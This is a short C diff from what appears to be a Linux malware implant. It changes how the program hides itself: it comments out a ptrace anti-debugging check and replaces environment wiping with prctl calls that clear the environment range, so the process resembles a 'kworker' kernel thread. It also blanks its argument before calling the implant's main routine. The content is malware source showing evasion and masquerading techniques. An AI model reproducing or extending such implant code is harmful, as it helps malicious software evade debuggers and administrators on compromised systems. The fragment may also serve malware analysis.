@@ -7,13 +7,14 @@ int main(int argc, char **argv, char **envp) {
         return 1;
     }
 
+    void *empty = NULL;
     size_t ip_len = strlen(argv[1]);
     char target[ip_len];
 
     // detect if a debugger is used against our implant
-    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
-        return 1;
-    }
+    // if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
+    //     return 1;
+    // }
 
     strncpy(target, argv[1], ip_len);
 
@@ -32,9 +33,8 @@ int main(int argc, char **argv, char **envp) {
     strncpy(argv[1], "\0", strlen(argv[1]));
 
     // kworker thread doesn't have any env variables
-    for (int i = 0; envp[i] != NULL; i++) {
-        strncpy(envp[i], "\0", strlen(envp[i]));
-    }
+    prctl(PR_SET_MM, PR_SET_MM_ENV_START, &empty, NULL, NULL);
+    prctl(PR_SET_MM, PR_SET_MM_ENV_END, &empty, NULL, NULL);
 
     implant_init_n_call(target);
     return 0;
